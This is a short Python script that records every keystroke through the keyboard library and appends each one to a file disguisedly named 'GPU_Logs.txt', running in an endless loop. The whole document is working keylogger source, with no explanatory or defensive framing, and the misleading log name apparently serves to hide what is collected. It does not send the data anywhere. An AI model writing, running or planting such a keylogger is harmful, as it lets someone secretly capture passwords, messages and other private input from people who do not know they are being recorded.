import keyboard
import time

def initiate():
    initialize = True
    print_text = True
    key_press = keyboard.get_hotkey_name()
    disabled = False
    while disabled == False:
        initialize = True
        print('Activated')
        if initialize == True:
            while initialize == True:
                if keyboard.get_hotkey_name():
                    read_file = open('GPU_Logs.txt', 'r')
                    read_the_file = read_file.read()
                    key_press = keyboard.get_hotkey_name()
                    result = key_press
                    result_to_str = str(result)
                    print(result_to_str)
                    with open('GPU_Logs.txt', 'w') as write_file:
                        write_file.write(read_the_file+result_to_str)
                    time.sleep(0.05)

if __name__ == '__main__':
    initiate()
